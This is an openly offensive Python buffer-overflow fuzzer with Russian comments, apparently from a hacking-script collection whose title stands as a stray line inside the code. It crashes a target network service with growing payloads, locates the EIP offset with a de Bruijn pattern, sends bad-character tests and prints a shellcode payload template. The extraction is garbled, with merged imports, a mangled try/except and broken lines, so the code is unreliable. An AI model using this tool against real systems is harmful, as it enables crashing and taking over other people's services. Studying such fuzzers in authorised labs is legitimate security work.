#!/usr/bin/env python3
importimportimportimportsocket
time
argparse
sys
import struct
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
ALPHABET =
b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
def cyclic(length: int, n: int = 4) -> bytes:
# Простая аппроксимация De Bruijn: комбинации из алфавита
result = bytearray()
db = debruijn(ALPHABET, n)
for i in range(length):
result.append(db[i % len(db)])
return bytes(result)
def debruijn(alphabet: bytes, n: int) -> bytes:
"""Генератор последовательности де Брюйна."""
k = len(alphabet)
a = [0] * k * n
db = []
def db_gen(t, p):
if t > n:
if n % p == 0:
db.extend(a[1:p + 1])
else:
a[t] = a[t - p]
db_gen(t + 1, p)
for j in range(a[t - p] + 1, k):
a[t] = j
db_gen(t + 1, t)
db_gen(1, 1)
return bytes(alphabet[i] for i in db)
30 Python-скриптов для Хакинга
def cyclic_find(subseq: bytes, n: int = 4) -> int:
pattern = cyclic(20000, n)
# Прямой поиск
idx = pattern.find(subseq)
if idx != -1:
return idx
# Попробуем little-endian
idx = pattern.find(subseq[::-1])
if idx != -1:
return idx
return -1
def tcp_send(host: str, port: int, data: bytes, timeout: float = 3) -> bool:
try:
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(timeout)
s.connect((host, port))
# Многие уязвимые сервисы сначала шлют баннер
try:
banner = s.recv(1024)
exceptpass
socket.timeout:
s.sendall(data)
# Пробуем получить ответ (или ждём разрыва)
try:
response = s.recv(1024)
s.close()
return True
except Exception:
s.close()
return False # Соединение разорвано — возможно краш
except (ConnectionRefusedError, socket.timeout, OSError):
return False
def phase_fuzz(host: str, port: int, prefix: bytes,
start: int, step: int, max_size: int) -> int:
print(f"{CYAN}[*] PHASE 1: FUZZING{RESET}")
print(f"{CYAN}[*] Цель: {host}:{port}{RESET}")
print(f"{CYAN}[*] Шаг: {step} байт | Максимум: {max_size}{RESET}")
print("-" * 50)
size = start
while size <= max_size:
payload = prefix + b"A" * size
print(f" {YELLOW}[*] Отправляем {size} байт...{RESET}", end=" ")
connected = tcp_send(host, port, payload)
if not connected:
print(f"{RED}[CRASH!]{RESET}")
print(f"\n{GREEN}[✓] Краш при размере: {size} байт{RESET}")
print(f"{GREEN}[✓] Начальный размер payload для следующей фазы: {size
+ step}{RESET}")
return size
else:
print(f"{GREEN}OK{RESET}")
size += step
time.sleep(0.1)
print(f"{RED}[-] Краш не обнаружен до {max_size} байт{RESET}")
return -1
def phase_pattern(host: str, port: int, prefix: bytes, size: int) -> bytes:
print(f"{CYAN}[*] PHASE 2: PATTERN SEND{RESET}")
print(f"{CYAN}[*] Генерируем cyclic pattern {size} байт{RESET}")
pattern = cyclic(size)
payload = prefix + pattern
print(f"{YELLOW}[*] Паттерн (первые 50 байт): {pattern[:50]}{RESET}")
print(f"{YELLOW}[*] Отправляем {len(payload)} байт...{RESET}")
tcp_send(host, port, payload, timeout=3)
print(f"{GREEN}[✓] Отправлено. Проверь значение EIP в отладчике.{RESET}")
print(f"{YELLOW}[!] Затем запусти: python bof_fuzzer.py --phase find-offset
--eip <EIP_VALUE>{RESET}")
return pattern
def phase_find_offset(eip_value: str) -> None:
print(f"{CYAN}[*] PHASE 3: FIND OFFSET{RESET}")
print(f"{CYAN}[*] Ищем offset для EIP = {eip_value}{RESET}")
# Конвертируем hex → bytes
try:
eip_bytes = bytes.fromhex(eip_value.replace("0x", ""))
except ValueError:
print(f"{RED}[!] Неверный формат. Используй hex без пробелов:
41366641{RESET}")
return
offset = cyclic_find(eip_bytes)
if offset != -1:
print(f"\n{GREEN}[✓] OFFSET НАЙДЕН: {offset} байт до EIP!{RESET}")
print(f"{GREEN}[✓] Структура exploit payload:{RESET}")
print(f" padding = b'A' * {offset}")
print(f" EIP
 = b'\\xXX\\xXX\\xXX\\xXX' # адрес JMP ESP или ROP
гаджета")
print(f" nop_sled = b'\\x90' * 16")
print(f" shellcode = b'\\x...' # твой шеллкод")
print(f"\n payload = padding + EIP + nop_sled + shellcode")
else:
print(f"{RED}[-] Offset не найден. Возможно размер pattern был
мал.{RESET}")
print(f"{YELLOW}[!] Попробуй увеличить размер pattern в --size{RESET}")
def phase_badchars(host: str, port: int, prefix: bytes, offset: int) -> None:
print(f"{CYAN}[*] PHASE 4: BAD CHARS{RESET}")
print(f"{CYAN}[*] Отправляем все байты 0x01-0xFF после offset{RESET}")
print(f"{YELLOW}[!] 0x00 (null byte) исключён — обычно всегда bad
char{RESET}")
# Все байты кроме 0x00
badchars = bytes(range(1, 256))
padding = b"A" * offset
eip_fake = b"B" * 4 # Заглушка для EIP
payload = prefix + padding + eip_fake + badchars
print(f"{YELLOW}[*] Отправляем {len(payload)} байт...{RESET}")
tcp_send(host, port, payload, timeout=3)
print(f"\n{GREEN}[✓] Отправлено. В отладчике:{RESET}")
print(f" 1. Смотри на ESP — там начинаются наши badchars")
print(f" 2. Ищи обрезанные/изменённые байты")
print(f" 3. Если после 0x09 сразу идёт 0x0B (пропущен 0x0A) — 0x0A is bad
char")
print(f"\n Байты отправлены: {badchars.hex()}")
def main():
parser = argparse.ArgumentParser(description="Buffer Overflow Fuzzer")
parser.add_argument("-t", "--target", default=None, help="IP цели")
parser.add_argument("-p", "--port", type=int, default=None, help="Порт
цели")
parser.add_argument("--phase",
 required=True,
choices=["fuzz", "pattern", "find-offset", "badchars"],
help="Фаза атаки")
parser.add_argument("--prefix",
 default="",
help="Префикс payload (например 'OVERFLOW ')")
parser.add_argument("--size",
 type=int, default=3000,
help="Размер для phase=pattern")
parser.add_argument("--start",
 type=int, default=100,
help="Начальный размер для fuzz фазы")
parser.add_argument("--step",
 type=int, default=100,
help="Шаг увеличения для fuzz")
parser.add_argument("--max",
 type=int, default=10000,
help="Максимальный размер для fuzz")
parser.add_argument("--eip",
 default=None,
help="Hex значение EIP из отладчика: 41366641")
parser.add_argument("--offset",
 type=int, default=0,
help="Offset для фазы badchars")
args = parser.parse_args()
prefix = args.prefix.encode() if args.prefix else b""
if args.phase == "fuzz":
if not args.target or not args.port:
print(f"{RED}[!] Нужны -t и -p для фазы fuzz{RESET}")
sys.exit(1)
phase_fuzz(args.target, args.port, prefix,
args.start, args.step, args.max)
elif args.phase == "pattern":
if not args.target or not args.port:
print(f"{RED}[!] Нужны -t и -p для фазы pattern{RESET}")
sys.exit(1)
phase_pattern(args.target, args.port, prefix, args.size)
elif args.phase == "find-offset":
if not args.eip:
print(f"{RED}[!] Нужен --eip для фазы find-offset{RESET}")
sys.exit(1)
phase_find_offset(args.eip)
elif args.phase == "badchars":
if not args.target or not args.port or not args.offset:
print(f"{RED}[!] Нужны -t, -p и --offset для фазы badchars{RESET}")
sys.exit(1)
phase_badchars(args.target, args.port, prefix, args.offset)
if __name__ == "__main__":
main()
